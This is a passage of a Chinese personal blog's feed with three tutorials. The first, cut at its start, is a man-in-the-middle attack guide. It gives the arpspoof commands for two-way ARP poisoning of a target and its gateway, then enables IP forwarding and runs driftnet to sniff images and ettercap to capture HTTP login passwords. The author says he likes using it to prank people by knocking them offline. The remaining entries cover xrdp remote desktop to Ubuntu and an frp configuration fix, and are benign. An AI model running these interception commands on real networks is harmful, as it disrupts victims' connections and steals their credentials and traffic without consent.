id="第三步：使用arpspoof进行双向欺骗"><a href="#第三步：使用arpspoof进行双向欺骗" class="headerlink" title="第三步：使用arpspoof进行双向欺骗"></a>第三步：使用arpspoof进行双向欺骗</h3><p>安装arpspoof：</p><pre><code>sudo apt-get install dsniff ssldump</code></pre><p>进行双向欺骗：<br>开两个终端，一个终端执行下面的一条指令。<br>arpspoof -i eth0 -t 192.168.1.127 192.168.1.1<br>arpspoof -i eth0 -t 192.168.1.1 192.168.1.127</p><p>此时，192.168.1.127这台设备应该是不能正常上网了。</p><p>我就是喜欢用这招来耍人，让他们上网上网就断网了，还找不到什么原因。</p><h3 id="第四步：进行端口转发"><a href="#第四步：进行端口转发" class="headerlink" title="第四步：进行端口转发"></a>第四步：进行端口转发</h3><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><h3 id="第五步：进行图片嗅探"><a href="#第五步：进行图片嗅探" class="headerlink" title="第五步：进行图片嗅探"></a>第五步：进行图片嗅探</h3><pre><code>driftnet -i eth0</code></pre><h3 id="第六步：嗅探登录密码http协议"><a href="#第六步：嗅探登录密码http协议" class="headerlink" title="第六步：嗅探登录密码http协议"></a>第六步：嗅探登录密码http协议</h3><pre><code>ettercap -Tq -i eth0</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;中间人攻击（Man-in-the-MiddleAttack，简称“MITM攻击”）是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://caijinbo.work/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Windows桌面远程Ubuntu系统</title>
    <link href="https://caijinbo.work/2019/12/27/Windows%E6%A1%8C%E9%9D%A2%E8%BF%9C%E7%A8%8BUbuntu%E7%B3%BB%E7%BB%9F/"/>
    <id>https://caijinbo.work/2019/12/27/Windows%E6%A1%8C%E9%9D%A2%E8%BF%9C%E7%A8%8BUbuntu%E7%B3%BB%E7%BB%9F/</id>
    <published>2019-12-27T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.136Z</updated>
    
    <content type="html"><![CDATA[<p>来自：互联网上的小蜘蛛</p><p>我们平时远程Linux系统都是用xshell、SecureCRT等工具来远程，远程进去的都是终端界面，现在要玩的是用Windows系统自带的“远程桌面连接”软件来远程Linux系统，以Ubuntu为例。</p><a id="more"></a><h2 id="安装xrdp"><a href="#安装xrdp" class="headerlink" title="安装xrdp"></a>安装xrdp</h2><p>Windows的远程桌面使用的协议为RDP，接下来需要在Ubuntu的操作系统中安装xrdp。</p><p>打开Ubuntu的终端命令窗口。输入下面的指令进行安装。<br>安装xrdp需要安装tightvncserver组件，下面的命令将其相关的组件安装完成。</p><p><code>#sudo apt-get install tightvncserver xrdp</code></p><h2 id="连接Ubuntu"><a href="#连接Ubuntu" class="headerlink" title="连接Ubuntu"></a>连接Ubuntu</h2><p>完成安装后，进入Windows的操作系统，这里为Windows 10操作系统，打开Windows的远程桌面工具，输入Ubuntu系统的IP地址，就可以进行远程桌面的链接。<br>链接成功后，选择xorg，输入链接Ubuntu桌面的账号和密码，这里为root帐号链接</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;来自：互联网上的小蜘蛛&lt;/p&gt;
&lt;p&gt;我们平时远程Linux系统都是用xshell、SecureCRT等工具来远程，远程进去的都是终端界面，现在要玩的是用Windows系统自带的“远程桌面连接”软件来远程Linux系统，以Ubuntu为例。&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://caijinbo.work/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>解决frp客户端不能同时多开问题</title>
    <link href="https://caijinbo.work/2019/12/26/frp%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8D%E8%83%BD%E5%90%8C%E6%97%B6%E5%A4%9A%E5%BC%80/"/>
    <id>https://caijinbo.work/2019/12/26/frp%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8D%E8%83%BD%E5%90%8C%E6%97%B6%E5%A4%9A%E5%BC%80/</id>
    <published>2019-12-26T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.128Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>前段时间我配置了frp内网穿透，最近我发现了一个问题，就是我配置了多台frp客户端，只有一台能正常连接，其他的客户端都连接不了，一开始我以为是我配置问题，反反复复的核对配置步骤，配置都是没有问题的。现在的情况是：例如说，服务端端口是7000，客户端端口是7001，6000，现在只能7000，7001端口开启 或者 7000，6000端口开启，却不能7000，7001，6000端口同时开启。这种情况带来了很大的不便，必须要找到解决方法才行。</p><a id="more"></a><h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>像这种情况还是配置问题，frp这么受欢迎的一个工具，不至于存在只能单用户机使用这么低级的功能的。所以问题应该还是出在配置上，且这个配置问题还是超出了我的认知范围。现在能解决的方法只能是查一下资料了。</p><h2 id="解决故障"><a href="#解决故障" class="headerlink" title="解决故障"></a>解决故障</h2><p>像这种使用比较广的工具，在网上的资料都是很齐全的了，只要愿意去找找就能找到解决的方法的。<br>通过搜索我终于找到了我的配置问题所在，原来是名字冲突了，修改一下名字即可。</p><p>[ssh2]     # 如果已经有一台叫[ssh]了，那么这里就修改为[ssh2],这样就不会冲突了。<br>type = tcp<br>local_ip = 192.168.2.195<br>local_port = 22<br>remote_port = 6000</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;前段时间我配置了frp内网穿透，最近我发现了一个问题，就是我配置了多台frp客户端，只有一台能正常连接，其他的客户端都连接不了，一开始我以为是我配置问题，反反复复的核对配置步骤，配置都是没有问题的。现在的情况是：例如说，服务端端口是7000，客户端端口是7001，6000，现在只能7000，7001端口开启 或者 7000，6000端口开启，却不能7000，7001，6000端口同时开启。这种情况带来了很大的不便，必须要找到解决方法才行。&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://caijinbo.work/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
</feed>
